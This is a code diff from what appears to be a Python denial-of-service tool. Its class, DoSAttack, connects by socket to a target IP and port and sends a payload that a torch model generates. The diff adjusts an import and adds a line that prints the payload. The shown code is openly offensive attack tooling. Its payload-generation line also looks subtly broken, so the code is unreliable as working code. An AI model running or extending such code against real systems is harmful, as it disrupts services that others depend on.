@@ -2,7 +2,7 @@ import torch
 import torch.nn as nn
 import socket
 import threading
-from .random_string_generator import RandomStringGenerator
+from random_string_generator import RandomStringGenerator
 
 
 class DoSAttack:
@@ -25,6 +25,7 @@ class DoSAttack:
             sock.connect((self.target_ip, self.target_port))
             payload = self.model(torch.tensor([])).encode()  # Generate payload
             sock.send(payload)
+            print("Payload: ", payload)
             sock.send(b"QUIT")
             sock.close()
         except Exception as e:
